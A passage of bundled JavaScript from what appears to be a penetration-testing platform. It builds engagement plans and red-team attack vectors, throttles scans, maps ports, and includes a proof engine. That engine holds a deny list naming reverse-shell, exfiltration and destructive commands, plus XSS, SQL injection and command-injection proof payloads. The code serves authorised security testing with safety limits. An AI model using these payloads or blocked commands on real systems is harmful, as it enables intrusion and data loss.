    sections.push(`## WAF/CDN Detected
${passiveDiscovery.wafDetected}`);
  }
  if (passiveDiscovery.breachExposure?.length > 0) {
    sections.push(`## Breach Exposure
${passiveDiscovery.breachExposure.length} breach records found`);
  }
  const dnsFindings = state.passiveDiscovery?.dnsSecurityFindings || [];
  if (dnsFindings.length > 0) {
    sections.push(`## DNS Security Findings (Passive)
${dnsFindings.map((f) => `- [${f.severity.toUpperCase()}] ${f.title}`).join("\n")}`);
  }
  for (const domain of domains.slice(0, 5)) {
    const recon = passiveRecon[domain];
    if (recon) {
      const ports = recon.shodan?.ports?.map((p) => p.port).join(", ") || "none detected";
      sections.push(`## Domain: ${domain}
- Open Ports (passive): ${ports}
- Subdomains: ${recon.subdomains?.length || 0}
- Technologies: ${recon.technologies?.join(", ") || "none detected"}`);
    }
  }
  if (engagement.roeNotes) {
    sections.push(`## RoE Notes / Restrictions
${engagement.roeNotes}`);
  }
  if (engagement.complianceFrameworks?.length > 0) {
    sections.push(`## Compliance Frameworks
${engagement.complianceFrameworks.join(", ")}`);
  }
  return sections.join("\n\n");
}
function buildDnsAssessmentPlan(state, passiveDiscovery) {
  const checks = [
    {
      category: "DNSSEC Validation",
      description: "Verify DNSSEC deployment, algorithm strength, key rotation, and chain of trust from root to zone",
      tools: ["dig +dnssec", "delv", "dnsviz.net", "dnsrecon"],
      nistReference: "NIST SP 800-81r3 \xA73.1",
      priority: "required"
    },
    {
      category: "Zone Transfer Testing",
      description: "Attempt AXFR/IXFR against all authoritative nameservers to verify access controls",
      tools: ["dig AXFR", "dnsrecon -t axfr", "nuclei -t dns-zone-transfer"],
      nistReference: "NIST SP 800-81r3 \xA74.1",
      priority: "required"
    },
    {
      category: "Subdomain Takeover",
      description: "Verify all CNAME targets are actively claimed; test for dangling records pointing to decommissioned services",
      tools: ["subjack", "nuclei -t takeovers", "can-i-take-over-xyz"],
      nistReference: "NIST SP 800-81r3 \xA74.2",
      priority: "required"
    },
    {
      category: "DNS Information Leakage",
      description: "Check TXT, HINFO, LOC, and CHAOS records for sensitive data exposure",
      tools: ["dig ANY", "dnsrecon -t std", "fierce"],
      nistReference: "NIST SP 800-81r3 \xA74.3",
      priority: "required"
    },
    {
      category: "Email Security Records",
      description: "Validate SPF, DKIM, and DMARC configuration for email authentication",
      tools: ["dig TXT", "mxtoolbox", "dmarc-analyzer"],
      nistReference: "NIST SP 800-81r3 \xA75.2",
      priority: "required"
    },
    {
      category: "Encrypted DNS Transport",
      description: "Test for DNS-over-TLS (DoT, port 853) and DNS-over-HTTPS (DoH) support on resolvers",
      tools: ["kdig +tls", "curl (DoH)", "naabu -p 853"],
      nistReference: "NIST SP 800-81r3 \xA76.1",
      priority: "recommended"
    },
    {
      category: "Recursive/Authoritative Separation",
      description: "Verify that authoritative servers do not also serve recursive queries (dual-function risk)",
      tools: ["dig +recurse", "nuclei -t dns-recursion"],
      nistReference: "NIST SP 800-81r3 \xA73.2",
      priority: "recommended"
    },
    {
      category: "Lame Delegation",
      description: "Verify all NS records point to responsive, authoritative nameservers",
      tools: ["dig NS", "dnsrecon -t std", "nslookup"],
      nistReference: "NIST SP 800-81r3 \xA74.2",
      priority: "required"
    },
    {
      category: "Lookalike Domain Detection",
      description: "Search for typosquat and homoglyph domains that could be used for phishing",
      tools: ["dnstwist", "urlcrazy", "amass"],
      nistReference: "NIST SP 800-81r3 \xA74.4",
      priority: "recommended"
    },
    {
      category: "DNS Tunneling Detection",
      description: "Analyze DNS query patterns for potential tunneling/exfiltration channels",
      tools: ["dnscat2 (detection)", "iodine (detection)", "dns-tunnel-detect"],
      nistReference: "NIST SP 800-81r3 \xA77.1",
      priority: "optional"
    }
  ];
  const dnsFindings = passiveDiscovery?.dnsSecurityFindings || [];
  const criticalFindings = dnsFindings.filter((f) => f.severity === "critical").length;
  const highFindings = dnsFindings.filter((f) => f.severity === "high").length;
  let passivePosture = "moderate";
  if (criticalFindings > 0) passivePosture = "critical";
  else if (highFindings > 2) passivePosture = "weak";
  else if (highFindings > 0) passivePosture = "moderate";
  else if (dnsFindings.length <= 2) passivePosture = "strong";
  return {
    checks,
    passivePosture,
    passiveFindings: dnsFindings.map((f) => `[${f.severity.toUpperCase()}] ${f.title}`)
  };
}
function generateFallbackTestPlan(state, engagement, passiveDiscovery) {
  const engType = engagement.engagementType || "pentest";
  const domains = (engagement.targetDomain || "").split(/[,;\s]+/).filter(Boolean);
  const isRedTeam = engType === "red_team";
  return [
    {
      id: "exec-summary",
      title: "Executive Summary",
      content: `This document presents the ${isRedTeam ? "Red Team Exercise" : "Penetration Test"} plan for ${engagement.clientName || engagement.name || "the target organization"}. The assessment will evaluate the security posture of ${domains.length} target domain(s) and associated infrastructure using a structured methodology aligned with NIST SP 800-115 and the Penetration Testing Execution Standard (PTES).

The assessment will proceed through the following phases: Domain Reconnaissance, Passive Discovery, Active Enumeration, Vulnerability Scanning, ${isRedTeam ? "Exploitation, C2 Deployment, Lateral Movement, and Objective Completion" : "Exploitation, and Evidence Collection"}.`,
      standardsReference: "NIST SP 800-115 \xA73"
    },
    {
      id: "scope",
      title: "Scope Definition",
      content: `### Authorized Targets
- Domains: ${domains.join(", ") || "TBD"}
- IP Ranges: ${engagement.targetIpRange || "TBD"}
- Total Assets Discovered: ${state.assets?.length || 0}
- Subdomains Discovered: ${passiveDiscovery.subdomains?.length || 0}

### Exclusions
${engagement.roeNotes || "No specific exclusions documented. Confirm with client before proceeding."}

### Testing Window
${engagement.testingWindow || "To be confirmed with client. Recommend business hours with 24-hour notice for disruptive testing."}`,
      standardsReference: "NIST SP 800-115 \xA74.1"
    },
    {
      id: "methodology",
      title: "Methodology",
      content: `The assessment follows a structured methodology:

1. **Domain Recon** \u2014 Passive OSINT gathering
2. **Passive Discovery** \u2014 DNS enumeration, certificate analysis, technology fingerprinting
3. **Active Discovery & Enumeration** \u2014 Port scanning, service identification, OS fingerprinting
4. **Vulnerability Scanning** \u2014 Automated and manual vulnerability identification
5. **${isRedTeam ? "Exploitation & Post-Exploitation" : "Penetration Testing"}** \u2014 ${isRedTeam ? "Exploitation, C2 deployment, lateral movement, and objective completion" : "Exploitation of confirmed vulnerabilities with evidence collection"}
6. **Reporting** \u2014 Comprehensive findings report with remediation recommendations`,
      standardsReference: "NIST SP 800-115 \xA74, PTES \xA72"
    },
    {
      id: "dns-assessment",
      title: "DNS Security Assessment",
      content: `DNS security will be assessed per NIST SP 800-81r3 (March 2026) guidance:

- **DNSSEC Validation** \u2014 Verify deployment, algorithm strength, and chain of trust
- **Zone Transfer Testing** \u2014 Attempt AXFR/IXFR against authoritative nameservers
- **Subdomain Takeover** \u2014 Check for dangling CNAME records
- **Information Leakage** \u2014 Analyze TXT, HINFO, LOC records
- **Email Security** \u2014 Validate SPF, DKIM, DMARC
- **Encrypted DNS** \u2014 Test DoT/DoH support
- **Recursive/Authoritative Separation** \u2014 Verify server role isolation
- **Lookalike Domains** \u2014 Detect typosquat/homoglyph domains`,
      standardsReference: "NIST SP 800-81r3"
    },
    {
      id: "tools",
      title: "Tools & Techniques",
      content: `### Planned Tools
- **Reconnaissance**: subfinder, amass, crt.sh, SecurityTrails
- **DNS**: dig, dnsrecon, dnstwist, dnsviz
- **Enumeration**: ScanForge discovery, httpx, masscan
- **Vulnerability Scanning**: nuclei, OWASP ZAP, nikto
- **Exploitation**: Metasploit Framework, custom scripts
${isRedTeam ? "- **C2**: Caldera, custom implants\n- **Post-Exploitation**: BloodHound, Mimikatz, Rubeus" : "- **Evidence Collection**: screenshot tools, data extraction scripts"}`,
      standardsReference: "NIST SP 800-115 \xA74.3"
    },
    {
      id: "risk-mitigation",
      title: "Risk Mitigation",
      content: `### Safeguards During Testing
- All testing within authorized scope per signed RoE
- Emergency stop procedures \u2014 testing halted immediately upon request
- DNS zone transfer testing uses read-only queries
- Exploitation targets only confirmed vulnerabilities
- Full audit trail with timestamps for all actions
- Rate limiting on active scans to prevent service disruption
- Immediate notification of critical findings`,
      standardsReference: "NIST SP 800-115 \xA75"
    },
    {
      id: "communication",
      title: "Communication Plan",
      content: `### Escalation Procedures
- Critical vulnerabilities: Immediate notification to ${engagement.escalationContact || "designated client contact"}
- Service disruption: Immediate halt and notification
- Status updates: ${engagement.reportingFrequency || "Daily summary during active testing"}

### Points of Contact
- Assessment Lead: ${engagement.assessorName || "TBD"}
- Client Contact: ${engagement.clientContact || "TBD"}
- Emergency Contact: ${engagement.escalationContact || "TBD"}`,
      standardsReference: "NIST SP 800-115 \xA75.2"
    },
    {
      id: "deliverables",
      title: "Deliverables",
      content: `### Expected Outputs
1. **${isRedTeam ? "Red Team Exercise Report" : "Penetration Test Report"}** \u2014 Comprehensive findings with severity ratings, evidence, and remediation
2. **Executive Summary** \u2014 High-level risk overview for leadership
3. **Technical Appendix** \u2014 Detailed tool outputs, scan logs, and evidence
4. **Remediation Roadmap** \u2014 Prioritized remediation plan
${isRedTeam ? "5. **Attack Narrative** \u2014 Step-by-step attack path documentation\n6. **Detection Gap Analysis** \u2014 Blue team detection coverage assessment" : "5. **Vulnerability Matrix** \u2014 All findings mapped to CVSS, CWE, and applicable standards"}`,
      standardsReference: "NIST SP 800-115 \xA76"
    }
  ];
}
function generateFallbackAttackVectors(state, engagement, passiveDiscovery) {
  const vectors = [];
  const domains = (engagement.targetDomain || "").split(/[,;\s]+/).filter(Boolean);
  const isRedTeam = engagement.engagementType === "red_team";
  vectors.push({
    id: "av-web-app",
    name: "Web Application Testing",
    description: "Test web applications for OWASP Top 10 vulnerabilities including injection, broken authentication, XSS, and security misconfigurations",
    targets: domains,
    tools: ["nuclei", "ZAP", "Burp Suite", "sqlmap", "nikto"],
    techniques: ["SQL Injection", "XSS", "CSRF", "SSRF", "Authentication Bypass", "Directory Traversal"],
    estimatedDuration: "2-3 days",
    riskLevel: "high"
  });
  vectors.push({
    id: "av-network",
    name: "Network Infrastructure Testing",
    description: "Enumerate and test network services, protocols, and configurations for vulnerabilities",
    targets: domains,
    tools: ["scanforge-discovery", "masscan", "Metasploit", "hydra"],
    techniques: ["Port Scanning", "Service Fingerprinting", "Default Credentials", "Protocol Exploitation"],
    estimatedDuration: "1-2 days",
    riskLevel: "high"
  });
  vectors.push({
    id: "av-dns",
    name: "DNS Infrastructure Assessment",
    description: "Comprehensive DNS security assessment per NIST SP 800-81r3 including DNSSEC, zone transfers, and subdomain takeover",
    targets: domains,
    tools: ["dig", "dnsrecon", "dnstwist", "subfinder", "nuclei"],
    techniques: ["Zone Transfer", "DNSSEC Validation", "Subdomain Takeover", "DNS Tunneling Detection"],
    estimatedDuration: "1 day",
    riskLevel: "medium"
  });
  if (passiveDiscovery.cloudProviders?.length > 0) {
    vectors.push({
      id: "av-cloud",
      name: "Cloud Infrastructure Testing",
      description: `Test ${passiveDiscovery.cloudProviders.join(", ")} cloud configurations for misconfigurations and exposed services`,
      targets: passiveDiscovery.cloudProviders,
      tools: ["ScoutSuite", "Prowler", "CloudSploit", "nuclei"],
      techniques: ["S3 Bucket Enumeration", "IAM Policy Review", "Metadata Service Access", "Cloud Storage Misconfiguration"],
      estimatedDuration: "1-2 days",
      riskLevel: "high"
    });
  }
  if (passiveDiscovery.emailAddresses?.length > 0 || isRedTeam) {
    vectors.push({
      id: "av-social",
      name: isRedTeam ? "Social Engineering & Phishing" : "Email Security Assessment",
      description: isRedTeam ? "Conduct targeted phishing campaigns and social engineering attacks against identified personnel" : "Assess email security controls including SPF, DKIM, DMARC, and phishing resilience",
      targets: domains,
      tools: isRedTeam ? ["GoPhish", "SET", "Evilginx"] : ["mxtoolbox", "dmarc-analyzer"],
      techniques: isRedTeam ? ["Spear Phishing", "Credential Harvesting", "Pretexting", "Vishing"] : ["SPF Validation", "DKIM Verification", "DMARC Policy Check"],
      estimatedDuration: isRedTeam ? "3-5 days" : "0.5 days",
      riskLevel: isRedTeam ? "high" : "medium"
    });
  }
  if (isRedTeam) {
    vectors.push({
      id: "av-c2",
      name: "Command & Control Operations",
      description: "Deploy C2 infrastructure, establish persistence, and conduct lateral movement to achieve engagement objectives",
      targets: domains,
      tools: ["Caldera", "Cobalt Strike", "Sliver", "BloodHound"],
      techniques: ["C2 Deployment", "Persistence", "Lateral Movement", "Privilege Escalation", "Data Exfiltration"],
      estimatedDuration: "3-5 days",
      riskLevel: "critical"
    });
  }
  return vectors;
}
var init_pipeline_phases = __esm({
  "server/lib/pipeline-phases.ts"() {
    "use strict";
    init_llm_throttle();
    init_dns_security_validator();
  }
});

// server/lib/scan-concurrency.ts
function acquireScanSlot(tool, engagementId) {
  if (canAcquire(tool, engagementId)) {
    return Promise.resolve(doAcquire(tool, engagementId));
  }
  return new Promise((resolve, reject) => {
    waitQueue.push({
      tool,
      engagementId,
      resolve,
      reject,
      enqueuedAt: Date.now()
    });
    if (!queueTimeoutChecker) {
      queueTimeoutChecker = setInterval(checkQueueTimeouts, 5e3);
    }
  });
}
function getScanConcurrencyMetrics() {
  const perEngagement = {};
  for (const scan of activeScans) {
    perEngagement[scan.engagementId] = (perEngagement[scan.engagementId] || 0) + 1;
  }
  return {
    activeNuclei: activeScans.filter((s) => s.tool === "nuclei").length,
    activeZap: activeScans.filter((s) => s.tool === "zap").length,
    activeOther: activeScans.filter((s) => s.tool !== "nuclei" && s.tool !== "zap").length,
    activeTotal: activeScans.length,
    queueDepth: waitQueue.length,
    totalAcquired,
    totalReleased,
    totalTimedOut,
    avgWaitMs: totalAcquired > 0 ? Math.round(totalWaitMs / totalAcquired) : 0,
    peakConcurrent,
    perEngagement
  };
}
function releaseAllForEngagement(engagementId) {
  const toRemove = activeScans.filter((s) => s.engagementId === engagementId);
  for (const scan of toRemove) {
    const idx = activeScans.indexOf(scan);
    if (idx >= 0) {
      activeScans.splice(idx, 1);
      totalReleased++;
    }
  }
  let queueRemoved = 0;
  for (let i = waitQueue.length - 1; i >= 0; i--) {
    if (waitQueue[i].engagementId === engagementId) {
      const entry = waitQueue.splice(i, 1)[0];
      entry.reject(new Error(`Engagement ${engagementId} aborted \u2014 scan slot released`));
      queueRemoved++;
    }
  }
  if (toRemove.length > 0 || queueRemoved > 0) {
    console.log(`[ScanConcurrency] Force-released ${toRemove.length} active + ${queueRemoved} queued slots for engagement ${engagementId}`);
    drainQueue();
  }
  return toRemove.length + queueRemoved;
}
function canAcquire(tool, engagementId) {
  if (activeScans.length >= config.maxConcurrentTotal) return false;
  const toolCount = activeScans.filter((s) => s.tool === tool).length;
  if (tool === "nuclei" && toolCount >= config.maxConcurrentNuclei) return false;
  if (tool === "zap" && toolCount >= config.maxConcurrentZap) return false;
  const engCount = activeScans.filter((s) => s.engagementId === engagementId).length;
  if (engCount >= config.maxPerEngagement) return false;
  return true;
}
function doAcquire(tool, engagementId) {
  const scan = { tool, engagementId, startedAt: Date.now() };
  activeScans.push(scan);
  totalAcquired++;
  if (activeScans.length > peakConcurrent) {
    peakConcurrent = activeScans.length;
  }
  return () => {
    const idx = activeScans.indexOf(scan);
    if (idx >= 0) {
      activeScans.splice(idx, 1);
      totalReleased++;
      drainQueue();
    }
  };
}
function drainQueue() {
  let i = 0;
  while (i < waitQueue.length) {
    const entry = waitQueue[i];
    if (canAcquire(entry.tool, entry.engagementId)) {
      waitQueue.splice(i, 1);
      const waitTime = Date.now() - entry.enqueuedAt;
      totalWaitMs += waitTime;
      const release = doAcquire(entry.tool, entry.engagementId);
      entry.resolve(release);
    } else {
      i++;
    }
  }
  if (waitQueue.length === 0 && queueTimeoutChecker) {
    clearInterval(queueTimeoutChecker);
    queueTimeoutChecker = null;
  }
}
function checkQueueTimeouts() {
  const now = Date.now();
  for (let i = waitQueue.length - 1; i >= 0; i--) {
    const entry = waitQueue[i];
    if (now - entry.enqueuedAt > config.queueTimeoutMs) {
      waitQueue.splice(i, 1);
      totalTimedOut++;
      entry.reject(new Error(
        `Scan queue timeout: ${entry.tool} for engagement ${entry.engagementId} waited ${Math.round((now - entry.enqueuedAt) / 1e3)}s (limit: ${config.queueTimeoutMs / 1e3}s). Active: ${activeScans.length}/${config.maxConcurrentTotal}, Queue: ${waitQueue.length}`
      ));
    }
  }
  if (waitQueue.length === 0 && queueTimeoutChecker) {
    clearInterval(queueTimeoutChecker);
    queueTimeoutChecker = null;
  }
}
var DEFAULT_CONFIG, config, activeScans, waitQueue, totalAcquired, totalReleased, totalTimedOut, totalWaitMs, peakConcurrent, queueTimeoutChecker;
var init_scan_concurrency = __esm({
  "server/lib/scan-concurrency.ts"() {
    "use strict";
    DEFAULT_CONFIG = {
      maxConcurrentNuclei: 2,
      maxConcurrentZap: 1,
      maxConcurrentTotal: 4,
      maxPerEngagement: 2,
      queueTimeoutMs: 5 * 60 * 1e3
      // 5 minutes
    };
    config = { ...DEFAULT_CONFIG };
    activeScans = [];
    waitQueue = [];
    totalAcquired = 0;
    totalReleased = 0;
    totalTimedOut = 0;
    totalWaitMs = 0;
    peakConcurrent = 0;
    queueTimeoutChecker = null;
  }
});

// server/lib/service-resolver.ts
function enrichPortServices(ports, passiveServices = []) {
  for (const p of ports) {
    if (p.service === "unknown" || p.service === "") {
      const passiveMatch = passiveServices.find((s) => s.port === p.port && s.service && s.service !== "unknown");
      if (passiveMatch) {
        p.service = passiveMatch.service;
        if (!p.version && passiveMatch.version) {
          p.version = passiveMatch.version;
        }
      } else {
        const wellKnown = WELL_KNOWN_PORTS[p.port];
        if (wellKnown) {
          p.service = wellKnown.service;
        }
      }
    }
  }
}
var WELL_KNOWN_PORTS;
var init_service_resolver = __esm({
  "server/lib/service-resolver.ts"() {
    "use strict";
    WELL_KNOWN_PORTS = {
      // SSH / Remote Access
      21: { service: "ftp", product: "FTP" },
      22: { service: "ssh", product: "SSH" },
      23: { service: "telnet", product: "Telnet" },
      2222: { service: "ssh", product: "SSH (alt)" },
      3389: { service: "rdp", product: "RDP" },
      5900: { service: "vnc", product: "VNC" },
      5901: { service: "vnc", product: "VNC" },
      // Web
      80: { service: "http", product: "HTTP" },
      443: { service: "https", product: "HTTPS" },
      8080: { service: "http-proxy", product: "HTTP Proxy" },
      8443: { service: "https-alt", product: "HTTPS (alt)" },
      8e3: { service: "http-alt", product: "HTTP (alt)" },
      8888: { service: "http-alt", product: "HTTP (alt)" },
      8090: { service: "http-alt", product: "HTTP (alt)" },
      3e3: { service: "http-alt", product: "HTTP (Node/dev)" },
      3001: { service: "http-alt", product: "HTTP (dev)" },
      4e3: { service: "http-alt", product: "HTTP (app)" },
      4443: { service: "https-alt", product: "HTTPS (alt)" },
      5e3: { service: "http-alt", product: "HTTP (Flask/dev)" },
      9e3: { service: "http-alt", product: "HTTP (PHP-FPM/SonarQube)" },
      9090: { service: "http-alt", product: "HTTP (Prometheus/Cockpit)" },
      9443: { service: "https-alt", product: "HTTPS (alt)" },
      // Mail
      25: { service: "smtp", product: "SMTP" },
      110: { service: "pop3", product: "POP3" },
      143: { service: "imap", product: "IMAP" },
      465: { service: "smtps", product: "SMTPS" },
      587: { service: "submission", product: "SMTP Submission" },
      993: { service: "imaps", product: "IMAPS" },
      995: { service: "pop3s", product: "POP3S" },
      // DNS
      53: { service: "dns", product: "DNS", protocol: "tcp/udp" },
      // Database
      1433: { service: "mssql", product: "Microsoft SQL Server" },
      1521: { service: "oracle", product: "Oracle DB" },
      3306: { service: "mysql", product: "MySQL/MariaDB" },
      5432: { service: "postgresql", product: "PostgreSQL" },
      6379: { service: "redis", product: "Redis" },
      27017: { service: "mongodb", product: "MongoDB" },
      9200: { service: "elasticsearch", product: "Elasticsearch" },
      9300: { service: "elasticsearch", product: "Elasticsearch (transport)" },
      5984: { service: "couchdb", product: "CouchDB" },
      8529: { service: "arangodb", product: "ArangoDB" },
      7474: { service: "neo4j", product: "Neo4j" },
      // Message Queues / Caches
      5672: { service: "amqp", product: "RabbitMQ" },
      15672: { service: "http-alt", product: "RabbitMQ Management" },
      6380: { service: "redis", product: "Redis (alt)" },
      11211: { service: "memcached", product: "Memcached" },
      9092: { service: "kafka", product: "Apache Kafka" },
      2181: { service: "zookeeper", product: "ZooKeeper" },
      // LDAP / Directory
      389: { service: "ldap", product: "LDAP" },
      636: { service: "ldaps", product: "LDAPS" },
      88: { service: "kerberos", product: "Kerberos" },
      464: { service: "kpasswd", product: "Kerberos Password" },
      // SMB / File Sharing
      135: { service: "msrpc", product: "MS-RPC" },
      137: { service: "netbios-ns", product: "NetBIOS Name Service", protocol: "udp" },
      138: { service: "netbios-dgm", product: "NetBIOS Datagram", protocol: "udp" },
      139: { service: "netbios-ssn", product: "NetBIOS Session" },
      445: { service: "smb", product: "SMB/CIFS" },
      2049: { service: "nfs", product: "NFS" },
      // Monitoring / Management
      161: { service: "snmp", product: "SNMP", protocol: "udp" },
      162: { service: "snmp-trap", product: "SNMP Trap", protocol: "udp" },
      514: { service: "syslog", product: "Syslog" },
      10050: { service: "zabbix-agent", product: "Zabbix Agent" },
      10051: { service: "zabbix-server", product: "Zabbix Server" },
      // Docker / Container
      2375: { service: "docker", product: "Docker API (unencrypted)" },
      2376: { service: "docker-tls", product: "Docker API (TLS)" },
      6443: { service: "kubernetes", product: "Kubernetes API" },
      10250: { service: "kubelet", product: "Kubelet API" },
      // CI/CD / DevOps
      8081: { service: "http-alt", product: "HTTP (Nexus/Jenkins)" },
      5e4: { service: "jenkins-agent", product: "Jenkins Agent" },
      // VPN / Proxy
      1194: { service: "openvpn", product: "OpenVPN" },
      1080: { service: "socks", product: "SOCKS Proxy" },
      3128: { service: "squid", product: "Squid Proxy" },
      8118: { service: "privoxy", product: "Privoxy" },
      // Other common
      111: { service: "rpcbind", product: "RPCBind" },
      179: { service: "bgp", product: "BGP" },
      500: { service: "isakmp", product: "IKE/IPSec", protocol: "udp" },
      548: { service: "afp", product: "Apple Filing Protocol" },
      554: { service: "rtsp", product: "RTSP" },
      873: { service: "rsync", product: "Rsync" },
      1723: { service: "pptp", product: "PPTP VPN" },
      1883: { service: "mqtt", product: "MQTT" },
      5060: { service: "sip", product: "SIP" },
      5061: { service: "sip-tls", product: "SIP (TLS)" },
      6660: { service: "irc", product: "IRC" },
      6667: { service: "irc", product: "IRC" },
      6697: { service: "ircs", product: "IRC (TLS)" }
    };
  }
});

// server/scanforge/engine/proof-engine.ts
import { randomUUID, createHash } from "crypto";
function checkProofSafety(payload, method, targetUrl, profile = DEFAULT_SAFETY_PROFILE) {
  if (!profile.allowedMethods.includes(method)) {
    return { allowed: false, reason: `HTTP method ${method} not in allowed list: [${profile.allowedMethods.join(", ")}]` };
  }
  for (const pattern of profile.forbiddenPayloadPatterns) {
    const regex = new RegExp(pattern, "i");
    if (regex.test(payload)) {
      return { allowed: false, reason: `Payload matches forbidden pattern: ${pattern}` };
    }
  }
  if (profile.skipSensitiveEndpoints) {
    for (const pattern of profile.sensitiveEndpointPatterns) {
      const regex = new RegExp(pattern, "i");
      if (regex.test(targetUrl)) {
        return { allowed: false, reason: `Target endpoint matches sensitive pattern: ${pattern}` };
      }
    }
  }
  const now = Date.now();
  const oneMinuteAgo = now - 6e4;
  if (proofRateLimiter.global.windowStart < oneMinuteAgo) {
    proofRateLimiter.global = { count: 0, windowStart: now };
  }
  if (proofRateLimiter.global.count >= profile.maxProofAttemptsPerMinuteGlobal) {
    return { allowed: false, reason: `Global rate limit exceeded: ${profile.maxProofAttemptsPerMinuteGlobal}/min` };
  }
  const endpointKey = new URL(targetUrl).pathname;
  const endpointState = proofRateLimiter.perEndpoint.get(endpointKey);
  if (endpointState) {
    if (endpointState.windowStart < oneMinuteAgo) {
      proofRateLimiter.perEndpoint.set(endpointKey, { count: 0, windowStart: now });
    } else if (endpointState.count >= profile.maxProofAttemptsPerMinutePerEndpoint) {
      return { allowed: false, reason: `Per-endpoint rate limit exceeded for ${endpointKey}: ${profile.maxProofAttemptsPerMinutePerEndpoint}/min` };
    }
  }
  return { allowed: true };
}
function recordProofAttempt(targetUrl) {
  const now = Date.now();
  proofRateLimiter.global.count++;
  const endpointKey = new URL(targetUrl).pathname;
  const state = proofRateLimiter.perEndpoint.get(endpointKey);
  if (state) {
    state.count++;
  } else {
    proofRateLimiter.perEndpoint.set(endpointKey, { count: 1, windowStart: now });
  }
}
function generateCanary() {
  const id = randomUUID().replace(/-/g, "").slice(0, 12);
  return `sf${id}prf`;
}
function generateMathProof() {
  const a = Math.floor(Math.random() * 9e3) + 1e3;
  const b = Math.floor(Math.random() * 9e3) + 1e3;
  return { expression: `${a}*${b}`, expected: String(a * b) };
}
function hashProofChain(finding, strategy, canary, response) {
  return createHash("sha256").update(`${finding.id}:${strategy}:${canary}:${response}:${Date.now()}`).digest("hex");
}
function classifyFinding(finding) {
  const text = `${finding.title} ${finding.source} ${(finding.cves || []).join(" ")} ${(finding.cwes || []).join(" ")}`.toLowerCase();
  if (text.includes("xss") || text.includes("cross-site scripting") || text.includes("cwe-79")) return "xss";
  if (text.includes("sqli") || text.includes("sql injection") || text.includes("cwe-89")) return "sqli";
  if (text.includes("cmdi") || text.includes("command injection") || text.includes("os injection") || text.includes("cwe-78")) return "cmdi";
  if (text.includes("ssrf") || text.includes("server-side request") || text.includes("cwe-918")) return "ssrf";
  if (text.includes("xxe") || text.includes("xml external") || text.includes("cwe-611")) return "xxe";
  if (text.includes("ssti") || text.includes("template injection") || text.includes("cwe-1336")) return "ssti";
  if (text.includes("lfi") || text.includes("path traversal") || text.includes("local file") || text.includes("cwe-22")) return "lfi";
  if (text.includes("redirect") || text.includes("cwe-601")) return "redirect";
  if (text.includes("csrf") || text.includes("cross-site request") || text.includes("cwe-352")) return "csrf";
  if (text.includes("deserialization") || text.includes("cwe-502")) return "deserialization";
  return "unknown";
}
var DEFAULT_SAFETY_PROFILE, RED_TEAM_SAFETY_PROFILE, proofRateLimiter, PROOF_PAYLOADS, ProofEngine;
var init_proof_engine = __esm({
  "server/scanforge/engine/proof-engine.ts"() {
    "use strict";
    DEFAULT_SAFETY_PROFILE = {
      // Only GET and POST — no state-modifying methods
      allowedMethods: ["GET", "POST", "HEAD", "OPTIONS"],
      // Forbidden patterns that could cause data loss or persistent changes
      forbiddenPayloadPatterns: [
        // SQL destructive operations
        "DROP\\s+(TABLE|DATABASE|INDEX|VIEW|SCHEMA)",
        "TRUNCATE\\s+TABLE",
        "DELETE\\s+FROM",
        "ALTER\\s+TABLE.*DROP",
        "UPDATE\\s+.*SET",
        // Blind UPDATE could modify data
        "INSERT\\s+INTO",
        // Could create records
        // OS command destructive operations
        "rm\\s+-[rf]",
        "rmdir",
        "mkfs",
        "dd\\s+if=",
        "chmod\\s+777",
        "shutdown",
        "reboot",
        "kill\\s+-9",
        "pkill",
        // Windows destructive
        "del\\s+/[fqs]",
        "format\\s+[a-z]:",
        "reg\\s+delete",
        // Network exfiltration (beyond OOB canary)
        "curl.*-d.*@",
        // File upload via curl
        "wget.*--post-file",
        "nc\\s+-e",
        // Netcat reverse shell
        "bash\\s+-i.*>/dev/tcp",
        // Bash reverse shell
        // PHP/code execution beyond detection
        "exec\\s*\\(",
        "system\\s*\\(",
        "passthru\\s*\\(",
        "eval\\s*\\("
      ],
      // Rate limits: 10 proofs/min per endpoint, 60 global
      maxProofAttemptsPerMinutePerEndpoint: 10,
      maxProofAttemptsPerMinuteGlobal: 60,
      // Cap response reading at 1MB
      maxResponseBodyBytes: 1048576,
      // No state-changing proofs by default
      allowStateChangingProofs: false,
      // Yellow tier (enumeration-level) authorization required
      minimumRoeTier: "yellow",
      // Skip sensitive endpoints
      skipSensitiveEndpoints: true,
      sensitiveEndpointPatterns: [
        "/api/(payment|billing|checkout|purchase|subscribe)",
        "/api/(delete|remove|destroy|cancel)",
        "/admin/(config|settings|users|roles)",
        "/(unsubscribe|deactivate|close-account)",
        "/api/v\\d+/(orders|transactions)/.*/(refund|cancel|void)"
      ],
      // Max 5-second delay for time-based proofs (prevents long-running DB queries)
      maxTimeDelaySeconds: 5,
      // Errors are acceptable (expected during proof), but 5xx may indicate damage
      acceptableFailureMode: "errors_ok"
    };
    RED_TEAM_SAFETY_PROFILE = {
      ...DEFAULT_SAFETY_PROFILE,
      allowedMethods: ["GET", "POST", "PUT", "PATCH", "HEAD", "OPTIONS"],
      allowStateChangingProofs: true,
      minimumRoeTier: "orange",
      skipSensitiveEndpoints: false,
      maxProofAttemptsPerMinutePerEndpoint: 30,
      maxProofAttemptsPerMinuteGlobal: 200,
      maxTimeDelaySeconds: 10,
      acceptableFailureMode: "errors_ok"
    };
    proofRateLimiter = {
      perEndpoint: /* @__PURE__ */ new Map(),
      global: { count: 0, windowStart: Date.now() }
    };
    PROOF_PAYLOADS = {
      // ── XSS Proof ──
      xss: [
        {
          payload: `"><img src=x onerror=alert('{{CANARY}}')>`,
          injection: "url_param",
          strategy: "reflection"
        },
        {
          payload: `{{CANARY}}`,
          injection: "url_param",
          strategy: "reflection"
        },
        {
          payload: `<{{CANARY}}>`,
          injection: "url_param",
          strategy: "reflection"
        }
      ],
      // ── SQL Injection Proof ──
      sqli: [
        {
          // Computation proof: inject math and check result
          payload: `' OR 1=1 UNION SELECT '{{CANARY}}' -- `,
          injection: "url_param",
          strategy: "reflection"
        },
        {
          // Time-based blind SQLi proof
          payload: `' OR SLEEP(5) -- `,
          injection: "url_param",
          strategy: "time_based"
        },
        {
          // Error-based proof
          payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,'{{CANARY}}')) -- `,
          injection: "url_param",
          strategy: "error_based"
        },
        {
          // Computation proof
          payload: `' UNION SELECT {{MATH_EXPR}} -- `,
          injection: "url_param",
          strategy: "computation"
        }
      ],
      // ── Command Injection Proof ──
      cmdi: [
        {
          payload: `; echo {{CANARY}}`,
          injection: "url_param",
          strategy: "reflection"
        },
        {
          payload: `| echo {{CANARY}}`,
          injection: "url_param",
          strategy: "reflection"
        },
        {
